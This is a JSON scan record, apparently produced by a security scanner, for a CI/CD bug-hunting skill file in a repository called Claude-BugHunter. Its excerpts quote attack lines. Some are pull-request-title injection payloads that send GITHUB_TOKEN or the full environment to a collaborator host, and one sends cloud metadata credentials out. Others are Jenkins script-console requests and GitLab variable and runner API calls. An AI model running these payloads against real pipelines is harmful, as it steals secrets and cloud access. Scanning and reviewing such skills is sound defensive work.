@@ -1,0 +1,286 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~hunt-cicd",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/hunt-cicd",
+  "name": "hunt-cicd",
+  "description": "Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow injection (pull_request_target Pwnrequest + ${{ }}-into-shell), self-hosted runner poisoning, OIDC trust-policy abuse, Jenkins script-console RCE and CVE-2024-23897 file read, GitLab CI runner-token registration, Terraform state file leakage, artifact/log secret leakage, pipeline env-var disclosure. Use when target has a public GitHub/GitLab org, exposed CI dashboards (Jenkins/TeamCity/Drone/Argo), or build artifacts/images are reachable.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "699928925c6b45bd6deb39334f87460a2aa8178e7aa24ceb8e7c7c23c3786a00",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 39,
+        "excerpt": "# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 40,
+        "excerpt": "curl -sI \"https://$TARGET/\" | grep -iE \"x-jenkins|x-hudson\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 41,
+        "excerpt": "curl -sI \"https://$TARGET/login\" | grep -i \"x-jenkins-session\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 43,
+        "excerpt": "code=$(curl -s -o /dev/null -w \"%{http_code}\" \"https://$TARGET$p\")",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target$p"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 50,
+        "excerpt": "# This must return uid=...(jenkins). If it returns the Jenkins login HTML or a",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 52,
+        "excerpt": "curl -s -X POST \"https://$TARGET/scriptText\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 71,
+        "excerpt": "# Download the matching jenkins-cli.jar from /jnlpJars/jenkins-cli.jar first.",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 103,
+        "excerpt": "PR title:  a\"; printenv GITHUB_TOKEN | base64 | tr -d '\\n' | { read T; curl \"https://x.<COLLAB>/?t=$T\"; }; echo \"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "x."
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 107,
+        "excerpt": "PR title:  foo\\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "x."
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 112,
+        "excerpt": "# in attacker's PR, e.g. package.json preinstall or Makefile:",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 113,
+        "excerpt": "curl -s \"https://x.<COLLAB>/?env=$(printenv | base64 -w0)\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "x."
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 119,
+        "excerpt": "- run: |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 121,
+        "excerpt": "curl -s \"https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "x."
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 122,
+        "excerpt": "curl -s \"https://x.<COLLAB>/imds=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "x.",
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 127,
+        "excerpt": "aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 135,
+        "excerpt": "# Enumerate org workflows that use the dangerous triggers",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 146,
+        "excerpt": "Triage candidates with the static analyzer before opening any PR: `gh extension install rhysd/actionlint` or run **zizmor** (`pip install zizmor; zizmor .github",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 156,
+        "excerpt": "# Public-repo run logs frequently contain secrets printed BEFORE ::add-mask:: took effect,",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 174,
+        "excerpt": "# Runner registration token → register an attacker runner that picks up jobs (and their secrets).",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 176,
+        "excerpt": "curl -s \"https://$TARGET/api/v4/projects/PID/variables\" -H \"PRIVATE-TOKEN: $TOK\"   # masked? protected?",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 177,
+        "excerpt": "curl -s \"https://$TARGET/api/v4/runners?type=instance_type\" -H \"PRIVATE-TOKEN: $TOK\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 181,
+        "excerpt": "curl -s \"https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 190,
+        "excerpt": "# Probe common public-bucket/path patterns (parameterize $T and $ORG)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 197,
+        "excerpt": "code=$(curl -s -o /tmp/tf.json -w \"%{http_code}\" \"$U\")",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 214,
+        "excerpt": "docker pull ORG/IMAGE:latest",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-cicd/SKILL.md",
+        "line": 254,
+        "excerpt": "- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. ",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 11,
+      "network": 13,
+      "downloads-code": 1,
+      "reads-secrets": 1
+    },
+    "score": 69,
+    "band": "review",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 69,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
